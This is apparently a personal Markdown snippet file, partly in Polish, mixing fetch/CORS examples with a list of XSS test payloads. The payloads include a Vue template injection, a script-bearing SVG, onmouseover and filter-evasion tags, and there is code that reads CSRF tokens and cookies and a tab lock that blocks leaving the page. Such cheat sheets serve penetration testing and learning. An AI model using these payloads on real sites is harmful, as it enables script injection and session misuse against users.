### Extra pierdoły:

### Snippets:
Pobierz losowy obrazek 1000 x 1000px \
```wget https://picsum.photos/1000```

=========

### JS Snippets:
> Anti refresh / redirect tab lock.
```js
window.onbeforeunload = function(event) {
  event.preventDefault();
  event.returnValue = 'Are you sure you want to leave?';
  return 'Are you sure you want to leave?';
};
```
> Basic payload Vue
```vue
{{ alert("UwU") }}
```
> Basic payload in-element
```vue
<div v-html="'<script>alert(\"UwU\")<\/script>'"></div>
```

> Parse tokens and cookies in browser for fetch requests
```js
// Parse CSRF token and cookies from the current page
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
  const cookies = document.cookie;

// headers
headers: {
  "accept": "application/json",
  "x-csrf-token": csrfToken,
  "x-xsrf-token": cookies,
  "X-Requested-With": "XMLHttpRequest",
  "cache-control": "no-cache",
  "pragma": "no-cache",
  "credentials": "include"
}
```

### [CORS 101](https://medium.com/@cybersphere/fetch-api-the-ultimate-guide-to-cors-and-no-cors-cbcef88d371e)
> CORS
```js
// CORS
fetch('https://example.com/api/data', {
  mode:  'cors' 
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    key1: 'value1',
    key2: 'value2'
  })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error(error));
```

> NO CORS
```js
// NO CORS
fetch('https://example.com/api/data', {
  mode: 'no-cors'
})
  .then(response => console.log(response))
  .catch(error => console.error(error));
```

### Stored XSS [SVG / XML]
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/200/svg">
   <polygon id="triangle" points="10,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('UwU');
   </script>
</svg>
```
> XSS On Mouse Hover Event
```js
<IMG SRC=# onmouseover="alert('UwU')">
```
> Extraneus Open Brackets
```js
<<SCRIPT>alert("UwU");//\<</SCRIPT>
```
> Img Embed XSS
```js
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```
> IP vs Hostname / URL Encoded
```js
<A HREF="http://66.102.7.147/">XSS</A>
```
```js
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

# Docs
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html



\
\
\
\
\
\
.


**Alternatywne kryptonimy projektu xDDD**
> DUPA - Dzidowy Uniwersalny Pakiet Automatyzacji
